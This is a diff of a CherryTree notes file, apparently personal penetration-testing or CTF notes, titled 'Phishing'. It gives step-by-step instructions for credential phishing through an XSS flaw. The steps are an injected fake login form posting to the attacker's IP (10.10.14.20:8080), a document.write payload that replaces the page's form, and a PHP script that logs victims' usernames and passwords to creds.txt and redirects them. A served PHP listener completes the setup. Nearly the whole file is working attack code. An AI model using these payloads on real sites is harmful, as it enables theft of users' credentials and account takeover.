@@ -1,13 +1,27 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="11" master_id="0" name="Phishing" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747092025" ts_lastsave="1747092042">
+  <node unique_id="11" master_id="0" name="Phishing" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747092025" ts_lastsave="1747332929">
     <rich_text>1. setup listener on host&#13;
 2. Create Prooper Form with my IP&#13;
 3.	Simple Login Form to inject after xss is discovered:&#13;
-&lt;h3&gt;Please login to continue&lt;/h3&gt;&#13;
-&lt;form action=</rich_text>
-    <rich_text link="webs http://OUR_IP">http://OUR_IP</rich_text>
-    <rich_text>&gt;&#13;
+&#13;
+3 . Also make sure to remove fields u no longer want with (usually the once where u actually inserted thee xss: ctrl-shift-c&#13;
+&#13;
+     &#13;
+4. Combine in one payload:&#13;
+&#13;
+&#13;
+5. Make sure to not only listen since he gets error. Basic php script to save creds and fw him.:&#13;
+		save in tmp/tmpserver/index.php&#13;
+&#13;
+   &#13;
+6. Deploy php server go in tmp/tmpserver&#13;
+sudo php -S 0.0.0.0:80&#13;
+   &#13;
+        &#13;
+	&#13;</rich_text>
+    <codebox char_offset="119" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;h3&gt;Please login to continue&lt;/h3&gt;&#13;
+&lt;form action=http://OUR_IP&gt;&#13;
 	&lt;input type="username" name="username" placeholder="Username"&gt;&#13;
 	&lt;input type="password" name="password" placeholder="Password"&gt;&#13;
 	&lt;input type="submit" name="submit" value="Login"&gt;&#13;
@@ -18,33 +32,17 @@
 &lt;input type="text" placeholder="Password"&gt;&#13;
 &lt;input type="submit" value="Login"&gt;&#13;
 &lt;br&gt;&lt;br&gt;&#13;
-&lt;/div&gt;&#13;
-3 . Also make sure to remove fields u no longer want with (usually the once where u actually inserted thee xss: ctrl-shift-c&#13;
-     	document.getElementById('urlform').remove();&#13;
-     &#13;
-4. Combine in one payload:&#13;
-document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=</rich_text>
-    <rich_text link="webs http://10.10.14.20:8080">http://10.10.14.20:8080</rich_text>
-    <rich_text>&gt;&lt;input type="username" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt;');document.getElementById('urlform').remove(); &#13;
-&#13;
-5. Make sure to not only listen since he gets error. Basic php script to save creds and fw him.:&#13;
-		save in tmp/tmpserver/index.php&#13;
-&lt;?php&#13;
+&lt;/div&gt;</codebox>
+    <codebox char_offset="248" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">document.getElementById('urlform').remove();</codebox>
+    <codebox char_offset="286" justification="left" frame_width="2844" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.14.20:8080&gt;&lt;input type="username" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt;');document.getElementById('urlform').remove(); </codebox>
+    <codebox char_offset="424" justification="left" frame_width="977" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?php&#13;
 if (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {&#13;
     $file = fopen("creds.txt", "a+");&#13;
     fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");&#13;
-    header("Location: </rich_text>
-    <rich_text link="webs http://SERVER_IP/phishing/index.php">http://SERVER_IP/phishing/index.php</rich_text>
-    <rich_text>");&#13;
+    header("Location: http://SERVER_IP/phishing/index.php");&#13;
     fclose($file);&#13;
     exit();&#13;
 }&#13;
-?&gt;&#13;
-   &#13;
-6. Deploy php server go in tmp/tmpserver&#13;
-		sudo php -S 0.0.0.0:80&#13;
-   &#13;
-        &#13;
-	&#13;</rich_text>
+?&gt;</codebox>
   </node>
 </cherrytree>
